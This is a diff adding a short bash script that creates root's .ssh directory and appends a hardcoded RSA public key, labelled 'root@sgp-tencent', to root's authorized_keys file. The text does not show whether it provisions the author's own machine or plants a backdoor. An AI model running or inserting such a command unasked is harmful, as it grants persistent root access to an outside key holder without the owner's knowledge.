@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+
+mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmNNT8K0JwRI9ysY+KugKBS/5MGr/ZfEcbPjfBsdDGRbJKd2ig3Pf4rKb7G1d18sWF7tSpbRpShsya6iUVrjWOjysUPMXzi7agZ/uF+Opf5m1auVeZz4llH1pQGuiyqGhV7ESEdAem002WwkcyOH21bkPNpuUt8kku0XuoiQDy5CWC193tYO1Rl2tXEwvE35KkHKVxvYc21mNf+pgHnKPKwN/Q4OS826hBfCJ/r0X3tSr2ukl4UODTRL9afkXeAzv0Le88mOX8tsJQeep/BymynNGADD75drht0ZPcHTSNTnmn5q+io0VtlqGj31+2NGIG8mExXoudCgpdfqq+GQnNFRTIHS6dQSOrvXKUFhOvdEluRnEaYynW5eGkQ08XdbfDjI0LNnpxji+jg6WO3tEgUyUyjz6fSNDLPBjkaLOf8K3lN10kanCZ7yes0gBdZqbkBU3O+ATmY/5/BBVIJmjc/DioyeiNtN79xhIjHLMXFThOOW5V5WaRoSGldKzPwoU= root@sgp-tencent' >> /root/.ssh/authorized_keys
